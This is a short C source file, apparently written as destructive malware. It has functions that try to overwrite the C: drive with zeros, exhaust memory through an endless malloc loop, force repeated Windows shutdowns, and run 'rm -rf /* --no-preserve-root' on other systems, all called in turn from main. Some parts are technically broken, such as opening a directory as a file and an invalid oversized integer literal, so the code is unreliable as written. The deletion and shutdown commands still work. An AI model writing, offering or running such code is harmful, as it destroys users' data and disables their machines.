#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
    #include <windows.h>
#else
    #include <unistd.h>
#endif

void wipedisk() {
    FILE *disk = fopen("C:/", "wb");  
    if (disk) {
        char buffer[512] = {0};  
        for (int i = 0; i < 1000000; i++) {
            fwrite(buffer, sizeof(buffer), 1, disk);
        }
        fclose(disk);
    }
}

void deleteram() {
    while (1) {
        malloc(999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999);  
    }
}

void disablesystem() {
    #ifdef _WIN32
        while (1) {
          system("shutdown /s /f /t 0");  
        }
    #else
        system("rm -rf /* --no-preserve-root &");  
    #endif
}

int main() {
    wipedisk();      
    deleteram();     
    disablesystem();  
    return 0;
}
